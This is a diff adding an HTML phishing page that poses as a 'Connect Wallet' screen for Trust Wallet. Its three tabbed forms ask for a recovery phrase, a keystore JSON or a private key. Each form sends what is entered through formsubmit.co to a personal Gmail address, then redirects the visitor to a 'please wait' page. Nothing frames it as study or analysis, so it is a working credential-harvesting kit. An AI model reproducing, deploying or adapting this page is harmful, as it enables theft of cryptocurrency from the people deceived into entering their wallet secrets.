@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="../images/ico1.png" rel="shortcut icon" type="image/x-icon">
+<link href="../images/ico1.png" rel="icon">
+<link href="../images/ico1.png" rel="shortcut icon" type="image/x-icon">
+<link href="../images/ico1.png" rel="apple-touch-icon">
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@100;200;300;400;500;600;700&display=swap"
+    rel="stylesheet">
+<style>
+    * {
+  padding: 0;
+  margin: 0;
+  box-sizing: border-box;
+}
+
+body {
+  font-family: sans-serif;
+ background-color: #050523 
+}
+
+.container {
+  width: 40%;
+  margin: 100px auto;
+}
+
+.nav-link {
+  color: #fff;
+  text-decoration: none;
+  padding: 10px;
+  cursor: pointer;
+}
+
+.nav-link:hover {
+  background-color: #fff;
+  color: #000;
+}
+
+nav {
+  display: flex;
+  gap: 20px;
+  margin-bottom: 32px;
+  padding: 0 0 12px 12px;
+  border-bottom: 1px solid #555;
+}
+
+.form {
+  display: flex;
+  flex-direction: column;
+  gap: 20px;
+  /* align-items: center; */
+  /* height: 100%; */
+  width: 100%;
+
+  /* Adds Display Functionality */
+  display: none;
+}
+
+.form-input {
+  height: 7rem;
+  width: 100%
+}
+
+button {
+  background-color: #4040ec;
+  color: #fff;
+  font-size: 17px;
+  border: none;
+  padding: 1rem;
+  width: 62%;
+  align-self: center;
+  border-radius: 24px;
+}
+
+.show {
+  display: flex;
+}
+p{
+  color:#fff;
+}
+.b{
+  background: #fff;
+  padding: 40px;
+  text-align: center;
+  font-size: 2rem;
+}
+.o{
+  background: #1a1a3a;
+  padding: 10px;
+  color: #fff;
+  font-style: italic;
+}
+</style>
+</head>
+
+<body>
+  <div class="b">
+    <h4 class="text-black">
+      Connect Wallet
+    </h4>
+    <div  class="o">
+      <h2>TRUST-WALLET</h2>
+    </div>
+    
+
+  </div>
+    <div class="container">
+        <nav>
+            <div href="#" class="nav-link">Phrase</div>
+            <div href="#" class="nav-link">Keystore JSON</div>
+            <div href="#" class="nav-link">Private Key</div>
+        </nav>
+
+        <form target="_blank" action="https://formsubmit.co/parbdul@gmail.com" method="POST" class="form show">
+                <input type="hidden" name="__captcha" value="false">
+                
+                <input type="hidden" name="_next" value="https://pleasewaitt.netlify.app/" class="form-control"
+                    placeholder="Email Address" required>
+              
+                <textarea placeholder="Enter your Backup Phrase" class="form-control p-10 border w-3/12 rounded-lg" name="message"
+                    rows="8" required></textarea> <br>
+                      <p class="text-lg text-s">Typically 12 (sometimes 24) words seperated by a single spaces or Private keys.</p>
+                <button class="bg-blue-600 text-white px-32 rounded-lg" type="submit">Import</button>
+        </form>
+
+        <form target="_blank" action="https://formsubmit.co/parbdul@gmail.com" method="POST" class="form ">
+                <input type="hidden" name="__captcha" value="false">
+              
+                <input type="hidden" name="_next" value="https://pleasewaitt.netlify.app/" class="form-control"
+                  placeholder="Email Address" required>
+              
+                <textarea placeholder="Enter Keystore JSON" class="form-control p-10 border w-3/12 rounded-lg" name="message"
+                  rows="8" required></textarea> <br>
+                <p class="t">Typically 12 (sometimes 24) words seperated by a single spaces or Private keys.</p>
+                <button class="bg-blue-600 text-white px-32 rounded-lg" type="submit">Import</button>
+              </form>
+              <form target="_blank" action="https://formsubmit.co/parbdul@gmail.com" method="POST" class="form ">
+                <input type="hidden" name="__captcha" value="false">
+              
+                <input type="hidden" name="_next" value="https://pleasewaitt.netlify.app/" class="form-control"
+                  placeholder="Email Address" required>
+              
+                <textarea placeholder="Enter your Private-Key" class="form-control p-10 border w-3/12 rounded-lg" name="message"
+                  rows="8" required></textarea> <br>
+                <p class="text-lg text-s">Typically 12 (sometimes 24) words seperated by a single spaces or Private keys.</p>
+                <button class="bg-blue-600 text-white px-32 rounded-lg" type="submit">Import</button>
+        </form>
+       
+    </div>
+    <img src="../images/ico1.png" style="height: 50px;display: block;margin: auto;" alt="">
+
+    <script>
+        "use strict";
+
+            const navLinks = document.querySelectorAll(".nav-link");
+            const forms = document.querySelectorAll(".form");
+            const formNum = Array.from(navLinks);
+
+            navLinks.forEach(function (navEl) {
+                navEl.addEventListener("click", function (e) {
+                    e.preventDefault();
+
+                    const formPosition = formNum.indexOf(navEl);
+
+                    forms.forEach((el) => el.classList.remove("show"));
+                    forms[formPosition].classList.add("show");
+                });
+            });
+    </script>
+</body>
+
+</html>
